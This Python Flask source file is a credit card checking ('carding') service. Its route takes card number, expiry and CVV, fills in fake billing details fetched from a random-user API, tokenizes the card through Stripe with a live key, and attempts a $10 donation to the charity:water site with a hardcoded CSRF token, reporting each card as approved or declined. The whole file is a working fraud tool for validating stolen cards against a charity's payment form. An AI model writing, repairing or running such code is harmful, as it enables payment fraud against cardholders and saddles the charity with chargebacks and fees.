from flask import Flask, request, jsonify
import requests
import random
import string

app = Flask(__name__)

def generate_random_string(length):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def get_random_user():
    try:
        response = requests.get('https://randomuser.me/api/?nat=us')
        data = response.json()
        user = data['results'][0]
        return {
            'name': f"{user['name']['first']} {user['name']['last']}",
            'email': user['email'],
            'address': f"{user['location']['street']['number']} {user['location']['street']['name']}",
            'city': user['location']['city'],
            'state': user['location']['state'],
            'zip': str(user['location']['postcode']),
            'country': 'US',
            'phone': user['phone']
        }
    except:
        # Fallback if API fails
        return {
            'name': 'John Doe',
            'email': 'john.doe@example.com',
            'address': '123 Main St',
            'city': 'New York',
            'state': 'NY',
            'zip': '10001',
            'country': 'US',
            'phone': '+15555555555'
        }

@app.route('/gate=st10/key=darkwaslost/cc=<cc>')
def process_payment(cc):
    # Parse CC details
    try:
        cc_parts = cc.split('|')
        if len(cc_parts) != 4:
            return jsonify({
                'status': 'declined',
                'response': 'Invalid CC format. Use CC|MM|YYYY|CVV'
            })
        
        cc_number, mm, yy, cvv = cc_parts
        
        # Get random user details
        user = get_random_user()
        
        # Generate fresh nonce values
        guid = generate_random_string(32)
        muid = generate_random_string(32)
        sid = generate_random_string(32)
        
        # PM ID REQUEST 
        stripe_headers = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
        }

        stripe_data = {
            'type': 'card',
            'billing_details[address][postal_code]': user['zip'],
            'billing_details[address][city]': user['city'],
            'billing_details[address][country]': user['country'],
            'billing_details[address][line1]': user['address'],
            'billing_details[email]': user['email'],
            'billing_details[name]': user['name'],
            'card[number]': cc_number,
            'card[cvc]': cvv,
            'card[exp_month]': mm,
            'card[exp_year]': yy[-2:],  # Use last 2 digits of year
            'guid': guid,
            'muid': muid,
            'sid': sid,
            'payment_user_agent': 'stripe.js/ca98f11090; stripe-js-v3/ca98f11090; card-element',
            'referrer': 'https://www.charitywater.org',
            'time_on_page': str(random.randint(100000, 999999)),
            'key': 'pk_live_51049Hm4QFaGycgRKpWt6KEA9QxP8gjo8sbC6f2qvl4OnzKUZ7W0l00vlzcuhJBjX5wyQaAJxSPZ5k72ZONiXf2Za00Y1jRrMhU'
        }

        stripe_response = requests.post('https://api.stripe.com/v1/payment_methods', 
                                      headers=stripe_headers, 
                                      data=stripe_data)

        stripe_data = stripe_response.json()
        
        if 'error' in stripe_data:
            return jsonify({
                'status': 'declined',
                'response': stripe_data.get('error', {}).get('message', 'Card declined')
            })
            
        payment_method_id = stripe_data["id"]

        # PROCESS DONATION REQUEST
        charity_headers = {
            'authority': 'www.charitywater.org',
            'accept': '*/*',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://www.charitywater.org',
            'referer': 'https://www.charitywater.org/',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
            'x-csrf-token': 'RHcLlSc6cBabcV9vK-KbKjHqzys-ZDUCSfzZd7gBEAvuSfS-qYhgBTBCS5Msc_-rLWFfjnMfkCHaK6Xvv0UUYA',
            'x-requested-with': 'XMLHttpRequest',
        }

        charity_data = {
            'country': 'us',
            'payment_intent[email]': user['email'],
            'payment_intent[amount]': '1000',  # $10.00 in cents
            'payment_intent[currency]': 'usd',
            'payment_intent[payment_method]': payment_method_id,
            'disable_existing_subscription_check': 'false',
            'donation_form[amount]': '1000',  # $10.00 in cents
            'donation_form[comment]': '',
            'donation_form[display_name]': '',
            'donation_form[email]': user['email'],
            'donation_form[name]': user['name'].split()[0],
            'donation_form[payment_gateway_token]': '',
            'donation_form[payment_monthly_subscription]': 'false',
            'donation_form[surname]': user['name'].split()[-1],
            'donation_form[campaign_id]': 'a5826748-d59d-4f86-a042-1e4c030720d5',
            'donation_form[setup_intent_id]': '',
            'donation_form[subscription_period]': '',
            'donation_form[metadata][email_consent_granted]': 'false',
            'donation_form[metadata][full_donate_page_url]': 'https://www.charitywater.org/#give',
            'donation_form[metadata][phone_number]': user['phone'],
            'donation_form[metadata][plaid_account_id]': '',
            'donation_form[metadata][plaid_public_token]': '',
            'donation_form[metadata][uk_eu_ip]': 'false',
            'donation_form[metadata][url_params][touch_type]': '1',
            'donation_form[metadata][session_url_params][touch_type]': '1',
            'donation_form[metadata][with_saved_payment]': 'false',
            'donation_form[address][address_line_1]': user['address'],
            'donation_form[address][address_line_2]': '',
            'donation_form[address][city]': user['city'],
            'donation_form[address][country]': user['country'],
            'donation_form[address][zip]': user['zip'],
        }

        charity_response = requests.post('https://www.charitywater.org/donate/stripe', 
                                       headers=charity_headers, 
                                       data=charity_data)

        charity_data = charity_response.json()
        
        if 'error' in charity_data:
            status = 'declined'
            message = charity_data.get('error', {}).get('message', 'Payment failed')
        elif charity_response.status_code == 200:
            status = 'approved'
            message = 'Successful'
        else:
            status = 'declined'
            message = charity_response.text

        return jsonify({
            'status': status,
            'response': message,
        })

    except Exception as e:
        return jsonify({
            'status': 'error',
            'response': str(e)
        })

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=4532)
